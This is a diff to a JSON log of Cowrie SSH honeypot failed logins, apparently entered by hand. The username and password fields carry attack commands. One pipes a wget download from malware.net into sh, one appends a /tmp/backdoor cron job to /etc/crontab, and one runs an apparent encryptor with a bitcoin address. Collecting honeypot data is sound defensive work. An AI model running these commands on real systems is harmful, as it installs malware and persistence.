@@ -3,18 +3,6 @@
     {
       "log": {
         "eventid": "cowrie.login.failed",
-        "src_ip": "167.99.200.10",
-        "username": "\"./encryptor",
-        "password": "/data --bitcoin=bc1qxy\"persistence",
-        "timestamp": "2026-03-29T12:05:16.342424",
-        "submitted_at": "2026-03-29T12:05:16.342468",
-        "source": "manual_submission"
-      },
-      "submitted_at": "2026-03-29T12:05:16.342468"
-    },
-    {
-      "log": {
-        "eventid": "cowrie.login.failed",
         "src_ip": "185.199.108.153",
         "username": "\"echo",
         "password": "'* * * * * /tmp/backdoor' >> /etc/crontab\"",
@@ -599,6 +587,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-03-29T22:48:49.180413"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "198.51.100.5",
+        "username": "\"wget",
+        "password": "-q -O - malware.net/payload | sh\"",
+        "timestamp": "2026-03-29T22:48:50.382736",
+        "submitted_at": "2026-03-29T22:48:50.382756",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-03-29T22:48:50.382756"
     }
   ]
 }
